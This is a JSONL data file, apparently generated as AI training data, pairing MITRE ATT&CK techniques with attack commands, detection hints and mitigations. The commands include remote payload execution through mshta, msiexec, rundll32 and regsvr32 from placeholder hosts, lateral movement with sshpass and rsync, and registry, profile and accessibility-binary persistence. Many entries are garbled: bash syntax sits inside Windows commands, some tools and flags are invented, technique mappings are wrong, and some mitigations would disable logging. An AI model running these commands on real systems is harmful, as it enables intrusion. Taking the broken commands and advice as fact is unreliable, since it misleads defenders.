{"id":283,"tactic":"Lateral Movement","technique":"T1021.006: Remote Services: Windows Remote Management","threat":"Using winrs to execute commands on remote host.","command":"winrs -r:http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com cmd /c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)","detection":"Monitor winrs: `wmic process where name='winrs.exe' get commandline | findstr -r`; Event ID 4688.","mitigation":"Restrict winrs: `icacls %windir%\\System32\\winrs.exe /deny Everyone:RX`; Block WinRM: `netsh advfirewall firewall add rule name='Block WinRM' dir=in action=block protocol=TCP localport=5985`.","references":["MITRE ATT&CK T1021.006: https://attack.mitre.org/techniques/T1021/006/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect winrs remote execution and suggest WinRM restrictions."}
{"id":284,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Abusing magnify.exe for persistence via replacement.","command":"copy /y $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\magnify.exe","detection":"Monitor magnify changes: `dir %windir%\\System32\\magnify.exe /a`; Event ID 4657.","mitigation":"Restrict magnify: `icacls %windir%\\System32\\magnify.exe /deny Everyone:WX`; Enable file integrity monitoring: `sfc /scannow`.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect magnify tampering and suggest file protections."}
{"id":285,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp.exe to execute malicious INF locally.","command":"cmstp /ni /s C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf)","detection":"Monitor cmstp local: `wmic process where name='cmstp.exe' get commandline | findstr .inf`; YARA rule: `rule CmstpLocalInf { strings: $a = /cmstp.*\.inf/ nocase; condition: $a }`.","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Monitor INF execution: AppLocker.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp local INF execution and suggest AppLocker policies."}
{"id":286,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse netstat for network reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; netstat -ano | Out-File C:\\$(echo net$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor netstat: `wmic process where name='netstat.exe' get commandline | findstr -ano`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell netstat reconnaissance and suggest execution policy restrictions."}
{"id":287,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using PowerShell to collect disk information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-Disk | Out-File C:\\$(echo disk$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor disk collection: `wmic process where name='powershell.exe' get commandline | findstr Get-Disk`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell disk information collection and suggest execution policy restrictions."}
{"id":288,"tactic":"Lateral Movement","technique":"T1021.004: Remote Services: SSH","threat":"Using sshpass to automate SSH authentication for lateral movement.","command":"sshpass -p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) ssh $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com \"bash -c '/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh'\"","detection":"Monitor sshpass: `ps aux | grep sshpass | grep bash`; Monitor SSH traffic: `netstat -anp | grep :22`.","mitigation":"Restrict sshpass: `chmod 700 /usr/bin/sshpass`; Block SSH outbound: `iptables -A OUTPUT -p tcp --dport 22 -j DROP`.","references":["MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect sshpass automated SSH and suggest SSH restrictions."}
{"id":289,"tactic":"Persistence","technique":"T1546.006: LC_LOAD_DYLIB Addition","threat":"Injecting malicious dylib into macOS binary locally.","command":"install_name_tool -add_rpath /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dylib /Applications/$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8).app/Contents/MacOS/*","detection":"Monitor dylib changes: `otool -L /Applications/* | grep tmp`; Audit file changes: `auditctl -w /Applications -p wa`.","mitigation":"Restrict dylib modifications: `chmod 755 /Applications/*`; Enable SIP: `csrutil enable`.","references":["MITRE ATT&CK T1546.006: https://attack.mitre.org/techniques/T1546/006/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect local dylib injections and suggest SIP enforcement."}
{"id":290,"tactic":"Defense Evasion","technique":"T1218.001: Compiled HTML File","threat":"Using hh.exe to execute malicious CHM locally.","command":"hh C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm)","detection":"Monitor hh local: `wmic process where name='hh.exe' get commandline | findstr .chm`; YARA rule: `rule HhLocalChm { strings: $a = /hh.*\.chm/ nocase; condition: $a }`.","mitigation":"Restrict hh: `icacls %windir%\\hh.exe /deny Everyone:RX`; Monitor CHM execution: AppLocker.","references":["MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect hh local CHM execution and suggest AppLocker policies."}
{"id":291,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse arp for network reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; arp -a | Out-File C:\\$(echo arp$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor arp: `wmic process where name='arp.exe' get commandline | findstr -a`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell arp reconnaissance and suggest execution policy restrictions."}
{"id":292,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system memory information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-CimInstance Win32_PhysicalMemory | Out-File C:\\$(echo mem$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor memory collection: `wmic process where name='powershell.exe' get commandline | findstr Win32_PhysicalMemory`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell memory information collection and suggest execution policy restrictions."}
{"id":293,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using net.exe to execute commands on remote SMB share.","command":"net use \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\C$ /user:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) && net start $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))","detection":"Monitor net remote: `wmic process where name='net.exe' get commandline | findstr C$`; Event ID 5145.","mitigation":"Restrict net: `icacls %windir%\\System32\\net.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect net.exe SMB execution and suggest SMB restrictions."}
{"id":294,"tactic":"Persistence","technique":"T1547.009: Shortcut Modification","threat":"Modifying Start menu shortcut to execute malicious payload.","command":"copy %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\*.lnk %temp%\\$(echo lnk$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).lnk) && reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders /v Programs /t REG_SZ /d \"powershell -c 'I$(echo malicious | base64 -w0)'\"","detection":"Monitor Start menu shortcut changes: `dir %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\*.lnk /a`; Event ID 4657.","mitigation":"Restrict shortcut writes: `icacls %appdata%\\Microsoft\\Windows\\Start Menu\\Programs /deny Everyone:WX`; Audit shortcut modifications: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1547.009: https://attack.mitre.org/techniques/T1547/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect Start menu shortcut tampering and suggest file protections."}
{"id":295,"tactic":"Defense Evasion","technique":"T1218.008: Odbcconf","threat":"Using odbcconf.exe to execute malicious driver locally.","command":"odbcconf /S /A {CONFIGSYSDSN \"C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"}","detection":"Monitor odbcconf local: `wmic process where name='odbcconf.exe' get commandline | findstr .dll`; YARA rule: `rule OdbcconfLocalDll { strings: $a = /odbcconf.*\.dll/ nocase; condition: $a }`.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Monitor DLL execution: AppLocker.","references":["MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf local driver execution and suggest AppLocker policies."}
{"id":296,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse route for network manipulation.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; route add $(cat /dev/urandom | tr -dc '0-9.' | head -c 15) MASK 255.255.255.0 $(cat /dev/urandom | tr -dc '0-9.' | head -c 15) > C:\\$(echo route$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor route: `wmic process where name='route.exe' get commandline | findstr add`; Event ID 4688.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit network changes: `auditpol /set /subcategory:'System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell route manipulation and suggest network auditing."}
{"id":297,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect firewall rules.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-NetFirewallRule | Out-File C:\\$(echo fw$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor firewall rule collection: `wmic process where name='powershell.exe' get commandline | findstr Get-NetFirewallRule`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell firewall rule collection and suggest execution policy restrictions."}
{"id":298,"tactic":"Lateral Movement","technique":"T1021.001: Remote Desktop Protocol","threat":"Using tscon to hijack RDP sessions.","command":"tscon $(shuf -i 1-65535 -n 1) /dest:console /server:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com","detection":"Monitor tscon: `wmic process where name='tscon.exe' get commandline | findstr /dest`; Event ID 4688.","mitigation":"Restrict tscon: `icacls %windir%\\System32\\tscon.exe /deny Everyone:RX`; Disable RDP: `reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f`.","references":["MITRE ATT&CK T1021.001: https://attack.mitre.org/techniques/T1021/001/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect tscon RDP hijacking and suggest RDP restrictions."}
{"id":299,"tactic":"Persistence","technique":"T1546.013: PowerShell Profile","threat":"Injecting malicious code into PowerShell profile locally.","command":"echo \"I$(echo 'malicious' | base64 -w0)\" >> $PROFILE.CurrentUserAllHosts","detection":"Monitor PowerShell profiles: `Get-Content $PROFILE.CurrentUserAllHosts | findstr I`; Event ID 4663.","mitigation":"Restrict profile writes: `icacls $PROFILE.CurrentUserAllHosts /deny Everyone:WX`; Audit profile changes: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1546.013: https://attack.mitre.org/techniques/T1546/013/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect local PowerShell profile tampering and suggest file protections."}
{"id":300,"tactic":"Persistence","technique":"T1546.003: Windows Management Instrumentation Event Subscription","threat":"Using wmic to create malicious WMI event subscription for persistence.","command":"wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name=\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\",Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)'\"","detection":"Monitor WMI subscriptions: `wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter GET /FORMAT:LIST | findstr evil`; Event ID 5861.","mitigation":"Restrict WMI: `icacls %windir%\\System32\\wbem\\wmic.exe /deny Everyone:RX`; Audit WMI changes: `auditpol /set /subcategory:'Other Object Access Events' /success:enable`.","references":["MITRE ATT&CK T1546.003: https://attack.mitre.org/techniques/T1546/003/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect WMI event subscription tampering and suggest auditing."}
{"id":301,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 with shdocvw.dll to open malicious URL.","command":"rundll32 shdocvw.dll,OpenURL \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).html) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 shdocvw: `wmic process where name='rundll32.exe' get commandline | findstr shdocvw`; YARA rule: `rule Rundll32Shdocvw { strings: $a = /rundll32.*shdocvw.*http/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block URL execution: AppLocker.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 shdocvw execution and suggest AppLocker policies."}
{"id":302,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse w32tm for time-based persistence.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; w32tm /config /manualpeerlist:http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com /syncfromflags:manual /update; Start-Service w32time\"","detection":"Monitor w32tm: `wmic process where name='w32tm.exe' get commandline | findstr http`; Event ID 4688.","mitigation":"Restrict w32tm: `icacls %windir%\\System32\\w32tm.exe /deny Everyone:RX`; Audit time service changes: `auditpol /set /subcategory:'System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect w32tm abuse and suggest service auditing."}
{"id":303,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using scquery to collect service configuration details.","command":"scquery > $(echo svc$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor scquery: `wmic process where name='sc.exe' get commandline | findstr scquery`; Event ID 4663.","mitigation":"Restrict sc: `icacls %windir%\\System32\\sc.exe /deny Everyone:RX`; Audit service queries: `auditpol /set /subcategory:'System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect scquery service collection and suggest access controls."}
{"id":304,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using netsh to execute remote SMB commands via portproxy.","command":"netsh interface portproxy add v4tov4 listenport=$(shuf -i 1000-65535 -n 1) connectaddress=\\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) connectport=445","detection":"Monitor netsh portproxy: `wmic process where name='netsh.exe' get commandline | findstr portproxy`; Event ID 4688.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect netsh portproxy SMB execution and suggest SMB restrictions."}
{"id":305,"tactic":"Persistence","technique":"T1546.004: Unix Shell Configuration Modification","threat":"Abusing Linux at command for scheduled task persistence.","command":"echo \"/bin/bash -c 'http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh'\" | at now + 1 minute","detection":"Monitor at jobs: `atq | grep http`; Audit at changes: `auditctl -w /etc/at.allow -p wa`.","mitigation":"Restrict at: `chmod 700 /usr/bin/at`; Disable at service: `systemctl disable atd`.","references":["MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect at command tampering and suggest service restrictions."}
{"id":306,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta.exe to execute malicious HTML Application remotely.","command":"mshta http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hta) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor mshta remote: `wmic process where name='mshta.exe' get commandline | findstr http`; YARA rule: `rule MshtaRemoteHta { strings: $a = /mshta.*http.*hta/ nocase; condition: $a }`.","mitigation":"Restrict mshta: `icacls %windir%\\System32\\mshta.exe /deny Everyone:RX`; Block HTA downloads: `netsh advfirewall firewall add rule name='Block mshta' dir=out program='%windir%\\System32\\mshta.exe' action=block`.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta remote HTA execution and suggest firewall rules."}
{"id":307,"tactic":"Execution","technique":"T1059.006: Python","threat":"Using Python to abuse az CLI for Azure VM creation.","command":"python -c \"import os; os.system('az vm create --resource-group $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) --name $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) --image UbuntuLTS --custom-data http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sh')\"","detection":"Monitor az CLI: `wmic process where name='python.exe' get commandline | findstr az`; Audit Azure logs: Azure Activity Logs.","mitigation":"Restrict az CLI: `icacls %userprofile%\\.azure /deny Everyone:RX`; Enforce MFA: Azure IAM policies.","references":["MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect unauthorized az CLI execution and suggest MFA enforcement."}
{"id":308,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using PowerShell to collect system logon events.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4624]]' | Out-File C:\\$(echo logon$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor logon event collection: `wmic process where name='powershell.exe' get commandline | findstr Get-WinEvent`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Protect event logs: `icacls %windir%\\System32\\winevt\\Logs /deny Everyone:R`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell logon event collection and suggest log protections."}
{"id":309,"tactic":"Lateral Movement","technique":"T1021.004: Remote Services: SSH","threat":"Using rsync to transfer malicious payload to remote Linux host.","command":"rsync -e ssh $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sh) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com:/tmp","detection":"Monitor rsync: `ps aux | grep rsync | grep sh`; Monitor SSH traffic: `netstat -anp | grep :22`.","mitigation":"Restrict rsync: `chmod 700 /usr/bin/rsync`; Block SSH outbound: `iptables -A OUTPUT -p tcp --dport 22 -j DROP`.","references":["MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect rsync payload transfer and suggest SSH restrictions."}
{"id":310,"tactic":"Persistence","technique":"T1546.001: Netsh Helper DLL","threat":"Registering malicious Netsh Helper DLL for persistence.","command":"netsh add helper http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor netsh helper: `wmic process where name='netsh.exe' get commandline | findstr helper`; Event ID 4688.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block Netsh' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.001: https://attack.mitre.org/techniques/T1546/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect netsh helper DLL tampering and suggest firewall rules."}
{"id":311,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute malicious DLL via UNC path.","command":"regsvr32 /s /u \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor regsvr32 UNC: `wmic process where name='regsvr32.exe' get commandline | findstr \\\\`; YARA rule: `rule Regsvr32UncDll { strings: $a = /regsvr32.*\\\\/ nocase; condition: $a }`.","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32 UNC DLL execution and suggest SMB restrictions."}
{"id":312,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse gpresult for group policy reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; gpresult /R | Out-File C:\\$(echo gp$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor gpresult: `wmic process where name='gpresult.exe' get commandline | findstr /R`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect PowerShell gpresult reconnaissance and suggest execution policy restrictions."}
{"id":313,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using PowerShell to collect system uptime information.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime | Out-File C:\\$(echo uptime$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor uptime collection: `wmic process where name='powershell.exe' get commandline | findstr LastBootUpTime`; Event ID 4663.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Audit file creation: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell uptime collection and suggest execution policy restrictions."}
{"id":314,"tactic":"Lateral Movement","technique":"T1021.001: Remote Desktop Protocol","threat":"Using qwinsta to enumerate RDP sessions remotely.","command":"qwinsta /server:http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com > $(echo rdp$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor qwinsta remote: `wmic process where name='qwinsta.exe' get commandline | findstr http`; Event ID 4688.","mitigation":"Restrict qwinsta: `icacls %windir%\\System32\\qwinsta.exe /deny Everyone:RX`; Disable RDP: `reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f`.","references":["MITRE ATT&CK T1021.001: https://attack.mitre.org/techniques/T1021/001/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect qwinsta remote RDP enumeration and suggest RDP restrictions."}
{"id":315,"tactic":"Persistence","technique":"T1547.001: Registry Run Keys / Startup Folder","threat":"Adding malicious script to RunOnce registry key.","command":"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /t REG_SZ /d \"powershell -c 'I$(echo malicious | base64 -w0)'\" /f","detection":"Monitor RunOnce: `reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce | findstr powershell`; Event ID 4657.","mitigation":"Restrict RunOnce writes: `regini -h deny HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1547.001: https://attack.mitre.org/techniques/T1547/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect RunOnce registry tampering and suggest registry protections."}
{"id":316,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to execute malicious MSI via HTTP.","command":"msiexec /quiet /i http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor msiexec HTTP: `wmic process where name='msiexec.exe' get commandline | findstr http`; YARA rule: `rule MsiexecHttpMsi { strings: $a = /msiexec.*http.*msi/ nocase; condition: $a }`.","mitigation":"Restrict msiexec: `icacls %windir%\\System32\\msiexec.exe /deny Everyone:RX`; Block MSI downloads: `netsh advfirewall firewall add rule name='Block msiexec' dir=out program='%windir%\\System32\\msiexec.exe' action=block`.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec HTTP MSI execution and suggest firewall rules."}
